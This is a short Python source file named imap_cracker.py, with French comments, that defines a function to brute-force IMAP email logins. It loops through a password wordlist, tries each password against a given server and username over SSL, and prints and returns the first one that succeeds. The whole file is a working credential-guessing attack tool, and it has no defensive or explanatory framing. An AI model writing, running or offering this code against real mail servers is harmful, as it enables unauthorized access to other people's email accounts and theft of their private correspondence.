# imap_cracker.py

import imaplib

def imap_brute_force(server, username, wordlist, port=993):
    """
    Essaie de se connecter à un compte mail IMAP avec une wordlist.
    
    - server : IP ou domaine du serveur IMAP
    - username : nom d'utilisateur mail
    - wordlist : liste de mots de passe à tester
    - port : port du serveur IMAP (par défaut : 993)
    """
    for password in wordlist:
        try:
            mail = imaplib.IMAP4_SSL(server, port)
            mail.login(username, password)
            print(f"[✔] Connexion IMAP réussie avec : {password}")
            return password
        except imaplib.IMAP4.error:
            continue
        except Exception as e:
            print(f"[!] Erreur : {e}")
            break

    print("[✘] Aucun mot de passe IMAP trouvé.")
    return None
